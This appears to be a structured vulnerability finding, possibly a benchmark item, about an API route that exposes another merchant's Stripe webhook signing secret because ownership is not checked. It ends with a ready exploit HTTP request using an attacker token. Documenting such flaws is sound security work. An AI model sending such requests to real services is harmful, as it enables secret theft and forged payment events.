diagnosis: The route extracts the merchant's Stripe webhook signing secret via StripeTenantSettings without verifying that current_user.merchant_id == merchant_id. An attacker can obtain another merchant's webhook signing secret and forge incoming financial webhook events.
exploit_request:
GET /api/v1/integrations/stripe/mch_992104 HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
